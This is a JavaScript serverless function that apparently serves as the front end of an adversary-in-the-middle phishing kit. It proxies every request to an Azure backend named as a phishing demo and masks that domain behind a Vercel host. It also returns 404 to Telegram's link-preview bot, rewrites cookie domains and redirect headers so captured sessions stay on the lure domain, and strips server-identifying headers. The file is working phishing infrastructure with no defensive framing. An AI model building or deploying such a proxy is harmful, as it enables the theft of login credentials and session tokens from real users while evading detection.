// Vercel API function to proxy Azure Function
// This masks the domain and keeps everything under Vercel

export default async function handler(req, res) {
  const targetOrigin = 'https://azureaitm-phishing-demo-1755253259.azurewebsites.net'

  // Bot detection (keep simple and permissive)
  const userAgent = req.headers['user-agent'] || ''
  const botPatterns = ['TelegramBot'] // avoid blocking real browsers
  if (botPatterns.some(p => userAgent.includes(p))) {
    return res.status(404).end()
  }

  // Build target URL with path and query
  const incomingUrl = new URL(req.url, `https://${req.headers.host}`)
  const targetUrl = new URL(targetOrigin)

  // Support path passed via rewrite query param
  const passedPath = incomingUrl.searchParams.get('path')
  if (passedPath) {
    targetUrl.pathname = '/' + passedPath.replace(/^\/+/, '')
    // Rebuild search without our helper param
    const newSearch = new URLSearchParams(incomingUrl.searchParams)
    newSearch.delete('path')
    targetUrl.search = newSearch.toString() ? `?${newSearch.toString()}` : ''
  } else {
    targetUrl.pathname = incomingUrl.pathname
    targetUrl.search = incomingUrl.search
  }

  // Copy headers and normalize for upstream
  const headers = {}
  const dropList = new Set([
    'host', 'content-length', 'x-forwarded-host', 'x-vercel-deployment-url',
    'connection', 'accept-encoding'
  ])
  for (const [key, value] of Object.entries(req.headers)) {
    const k = key.toLowerCase()
    if (dropList.has(k)) continue
    headers[key] = value
  }
  // Do NOT set Host header; fetch will set it correctly for target automatically
  headers['x-forwarded-for'] = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || ''
  headers['x-forwarded-proto'] = req.headers['x-forwarded-proto'] || 'https'
  headers['origin'] = targetOrigin
  headers['referer'] = targetOrigin + targetUrl.pathname + targetUrl.search

  // Read raw body for non-GET/HEAD
  let body = undefined
  if (req.method !== 'GET' && req.method !== 'HEAD') {
    body = await readRawBody(req)
  }

  try {
    const upstreamResponse = await fetch(targetUrl.toString(), {
      method: req.method,
      headers,
      body,
      redirect: 'manual'
    })

    const vercelHost = req.headers.host
    const contentType = upstreamResponse.headers.get('content-type') || ''

    // Prepare headers for client
    const outHeaders = {}

    // Handle multiple Set-Cookie headers explicitly
    const raw = upstreamResponse.headers.raw ? upstreamResponse.headers.raw() : null
    const setCookies = raw && raw['set-cookie'] ? raw['set-cookie'] : (upstreamResponse.headers.get('set-cookie') ? [upstreamResponse.headers.get('set-cookie')] : [])
    if (setCookies && setCookies.length > 0) {
      const rewrittenCookies = setCookies.map((c) => rewriteCookieDomain(c, vercelHost))
      res.setHeader('Set-Cookie', rewrittenCookies)
    }

    // Copy other headers with URL rewrites where applicable
    upstreamResponse.headers.forEach((value, key) => {
      const k = key.toLowerCase()
      if (k === 'set-cookie') return
      if (k === 'server' || k === 'x-powered-by' || k === 'x-aspnet-version') return

      // Rewrite Location header on redirects to stay on Vercel domain
      if (k === 'location' && typeof value === 'string') {
        const rewritten = value
          .replace(new RegExp(escapeRegExp(targetOrigin), 'g'), `https://${vercelHost}`)
          .replace(new RegExp(escapeRegExp(new URL(targetOrigin).host), 'g'), vercelHost)
        outHeaders[key] = rewritten
        return
      }

      // Generic header value rewrite of azure domain to vercel domain
      if (typeof value === 'string') {
        outHeaders[key] = value
          .replace(new RegExp(escapeRegExp(targetOrigin), 'g'), `https://${vercelHost}`)
          .replace(new RegExp(escapeRegExp(new URL(targetOrigin).host), 'g'), vercelHost)
      } else {
        outHeaders[key] = value
      }
    })

    // Security headers
    outHeaders['x-frame-options'] = 'SAMEORIGIN'
    outHeaders['x-content-type-options'] = 'nosniff'
    outHeaders['referrer-policy'] = 'strict-origin-when-cross-origin'
    outHeaders['x-xss-protection'] = '1; mode=block'

    // For 3xx redirects, return as-is with rewritten Location
    if (upstreamResponse.status >= 300 && upstreamResponse.status < 400) {
      Object.entries(outHeaders).forEach(([k, v]) => res.setHeader(k, v))
      return res.status(upstreamResponse.status).end()
    }

    // Stream or transform body depending on content-type
    if (/^(text\/html|application\/javascript|text\/javascript|application\/json|text\/css)/i.test(contentType)) {
      let text = await upstreamResponse.text()
      // Rewrite in-body absolute URLs to keep user on Vercel domain
      text = text
        .replace(new RegExp(escapeRegExp(targetOrigin), 'g'), `https://${vercelHost}`)
        .replace(new RegExp(escapeRegExp(new URL(targetOrigin).host), 'g'), vercelHost)

      Object.entries(outHeaders).forEach(([k, v]) => res.setHeader(k, v))
      res.status(upstreamResponse.status).send(text)
    } else {
      // Binary / other content - stream as-is
      Object.entries(outHeaders).forEach(([k, v]) => res.setHeader(k, v))
      const arrayBuffer = await upstreamResponse.arrayBuffer()
      res.status(upstreamResponse.status).send(Buffer.from(arrayBuffer))
    }
  } catch (err) {
    res.status(503).json({ error: 'Service temporarily unavailable' })
  }
}

function escapeRegExp(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
}

function rewriteCookieDomain(cookieStr, vercelHost) {
  // Remove/replace Domain attribute to current host to keep cookies bound to vercel domain
  return cookieStr
    .replace(/;\s*Domain=[^;]+/i, `; Domain=${vercelHost}`)
}

function readRawBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = []
    req.on('data', (c) => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)))
    req.on('end', () => resolve(Buffer.concat(chunks)))
    req.on('error', reject)
  })
}
